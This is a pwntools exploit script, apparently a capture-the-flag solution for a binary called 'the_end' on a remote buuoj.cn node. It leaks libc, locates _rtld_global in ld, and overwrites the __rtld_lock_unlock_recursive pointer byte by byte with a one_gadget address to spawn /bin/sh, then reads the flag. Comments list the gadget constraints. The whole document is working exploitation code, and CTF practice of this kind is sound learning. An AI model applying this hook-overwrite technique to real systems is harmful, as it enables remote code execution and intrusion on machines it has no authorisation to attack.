from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node4.buuoj.cn",29187)
# io=process("./the_end")
elf=ELF("./the_end")
libc=ELF("./libc-2.27.so")
ld=ELF("./ld-2.27.so")

def ss(c,cc):
    io.send(c)
    io.send(cc)

io.recvuntil(b"gift ")
leak_addr=int(io.recv(14),16)
print("leak_addr: "+hex(leak_addr))
libc_base=leak_addr-libc.sym[b"sleep"]
print("libc_base: "+hex(libc_base))
ld_base=libc_base+0x3f1000
io.recvuntil(b";)\n")

_rtld_global=ld_base+ld.sym[b"_rtld_global"]
__rtld_lock_unlock_recursive=_rtld_global+0xf08
print("_rtld_global: "+hex(_rtld_global))
print("__rtld_lock_unlock_recursive: "+hex(__rtld_lock_unlock_recursive))

# one_gadget=[0x4f365,0x4f3c2,0x10a45c]
one_gadget=[0x4f2c5,0x4f322,0x10a38c]
shell=one_gadget[1]+libc_base
print("shell: ",hex(shell))

for i in range(5):
    ss(p64(__rtld_lock_unlock_recursive+i),p64(shell)[i:i+1])

io.sendline(b"exec 1>&0")
io.sendline(b"cat flag")

io.interactive()

# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
